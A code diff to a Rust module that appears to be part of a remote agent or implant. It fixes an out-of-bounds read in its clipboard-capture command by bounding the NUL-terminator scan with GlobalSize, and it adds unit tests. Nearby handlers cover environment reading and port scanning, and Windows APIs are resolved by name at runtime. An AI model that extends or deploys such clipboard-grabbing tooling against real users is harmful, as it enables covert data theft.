@@ -320,6 +320,25 @@ pub fn do_env(name: &str) -> Response {
 
 // ---- do_clipboard ----------------------------------------------------------
 
+/// Number of leading `T`-units before the first zero, scanning **at most**
+/// `max_units` units. The caller MUST guarantee that `p` is readable for
+/// `max_units * size_of::<T>()` bytes (derived from `GlobalSize` of a locked
+/// HGLOBAL in `do_clipboard`), so the scan never touches memory past the
+/// allocation even when the payload has no NUL terminator — malformed
+/// clipboard data yields `max_units` instead of an out-of-bounds read.
+fn bounded_nul_len<T: Copy + PartialEq>(p: *const T, max_units: usize) -> usize {
+    // SAFETY: `zeroed::<T>()` is sound for every `T` used here (u16 for
+    // CF_UNICODETEXT, u8 for CF_TEXT); the pattern value is only compared.
+    let nul: T = unsafe { core::mem::zeroed() };
+    let mut len = 0usize;
+    // SAFETY: `len < max_units`, and the caller guarantees
+    // `p..p.add(max_units)` is readable.
+    while len < max_units && unsafe { *p.add(len) } != nul {
+        len += 1;
+    }
+    len
+}
+
 /// Clipboard text. Force-loads user32, opens the clipboard and returns text as
 /// UTF-8 bytes. Prefers `CF_UNICODETEXT`; falls back to `CF_TEXT` (ANSI).
 pub fn do_clipboard() -> Response {
@@ -332,6 +351,9 @@ pub fn do_clipboard() -> Response {
     type IsClipboardFormatAvailable = unsafe extern "system" fn(u32) -> i32;
     type GlobalLock = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
     type GlobalUnlock = unsafe extern "system" fn(*mut c_void) -> i32;
+    // `SIZE_T` (usize). Returns the allocation size in bytes of the HGLOBAL,
+    // or 0 on failure — the bound for every NUL scan below.
+    type GlobalSize = unsafe extern "system" fn(*mut c_void) -> usize;
 
     let open: OpenClipboard = match unsafe { export_addr(b"user32.dll", b"OpenClipboard") } {
         Some(a) => unsafe { core::mem::transmute(a) },
@@ -360,6 +382,10 @@ pub fn do_clipboard() -> Response {
         Some(a) => unsafe { core::mem::transmute(a) },
         None => return Response::Err("clipboard: GlobalUnlock unresolved".into()),
     };
+    let gsize: GlobalSize = match unsafe { export_addr(b"kernel32.dll", b"GlobalSize") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err("clipboard: GlobalSize unresolved".into()),
+    };
 
     if unsafe { open(core::ptr::null_mut()) } == 0 {
         return Response::Err("clipboard: OpenClipboard failed".into());
@@ -381,33 +407,80 @@ pub fn do_clipboard() -> Response {
     if !h.is_null() {
         let p = unsafe { glock(h) };
         if !p.is_null() {
+            // Bound every scan by the locked allocation's size so a malformed
+            // clipboard payload without a NUL terminator can never read past
+            // the HGLOBAL. GlobalSize returns 0 on failure (bad handle) —
+            // bail out with an error rather than guessing a size.
+            let size_bytes = unsafe { gsize(h) };
+            if size_bytes == 0 {
+                unsafe { gunlock(h) };
+                unsafe { close() };
+                return Response::Err("clipboard: GlobalSize failed".into());
+            }
             if unicode {
-                // Count UTF-16 units up to the NUL terminator, then convert.
-                let mut len = 0usize;
-                unsafe {
-                    let w = p as *const u16;
-                    while *w.add(len) != 0 {
-                        len += 1;
-                    }
-                    let wide = core::slice::from_raw_parts(w, len);
-                    out = utf16_to_utf8_lossy(wide);
-                }
+                // Count UTF-16 units up to the NUL terminator (bounded by the
+                // allocation size in bytes / 2), then convert.
+                let len = bounded_nul_len(p as *const u16, size_bytes / 2);
+                // SAFETY: `len <= size_bytes / 2`, so the slice covers at most
+                // `size_bytes` bytes at `p`, which GlobalSize(h) guarantees
+                // readable for the lifetime of the lock.
+                let wide = unsafe { core::slice::from_raw_parts(p as *const u16, len) };
+                out = utf16_to_utf8_lossy(wide);
             } else {
-                // CF_TEXT is ANSI bytes; pass through verbatim (ASCII fast path).
-                unsafe {
-                    let b = p as *const u8;
-                    let mut len = 0usize;
-                    while *b.add(len) != 0 {
-                        len += 1;
-                    }
-                    out.extend_from_slice(core::slice::from_raw_parts(b, len));
-                }
+                // CF_TEXT is ANSI bytes; pass through verbatim (ASCII fast
+                // path), bounded by the allocation size.
+                let len = bounded_nul_len(p as *const u8, size_bytes);
+                // SAFETY: `len <= size_bytes`; see above.
+                out.extend_from_slice(unsafe {
+                    core::slice::from_raw_parts(p as *const u8, len)
+                });
             }
             unsafe { gunlock(h) };
         }
     }
     unsafe { close() };
     Response::Output(out)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::bounded_nul_len;
+
+    /// Well-formed data: terminator inside the bound → the scan stops at the
+    /// NUL (unchanged behavior for well-formed clipboard payloads).
+    #[test]
+    fn stops_at_nul_inside_bound() {
+        let b = [1u8, 2, 3, 0, 5, 6];
+        assert_eq!(bounded_nul_len(b.as_ptr(), b.len()), 3);
+        let w = [1u16, 2, 0, 5];
+        assert_eq!(bounded_nul_len(w.as_ptr(), w.len()), 2);
+    }
+
+    /// Malformed data: no NUL anywhere in the allocation → the scan returns
+    /// the full bound instead of reading past the end (the OOB bug).
+    #[test]
+    fn no_nul_returns_full_bound() {
+        let b = [7u8, 8, 9, 10];
+        assert_eq!(bounded_nul_len(b.as_ptr(), b.len()), b.len());
+        let w = [7u16, 8, 9];
+        assert_eq!(bounded_nul_len(w.as_ptr(), w.len()), w.len());
+    }
+
+    /// Terminator at the very last unit inside the bound is honored.
+    #[test]
+    fn nul_at_last_unit() {
+        let b = [1u8, 2, 0];
+        assert_eq!(bounded_nul_len(b.as_ptr(), b.len()), 2);
+        let w = [1u16, 0];
+        assert_eq!(bounded_nul_len(w.as_ptr(), w.len()), 1);
+    }
+
+    /// Zero bound → zero length without touching the pointer.
+    #[test]
+    fn zero_bound_returns_zero() {
+        let b = [1u8, 2, 3];
+        assert_eq!(bounded_nul_len(b.as_ptr(), 0), 0);
+    }
 }
 
 // ---- do_portscan -----------------------------------------------------------
